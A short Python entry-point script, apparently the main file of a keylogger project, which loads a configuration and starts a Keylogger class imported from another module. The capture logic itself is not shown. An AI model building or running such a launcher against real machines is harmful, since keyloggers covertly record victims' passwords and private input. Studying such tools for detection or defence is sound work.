from keylogger import Keylogger
from config import Config


def main():
    keylogger = Keylogger(Config.get_config())
    keylogger.run()


if __name__ == "__main__":
    main()
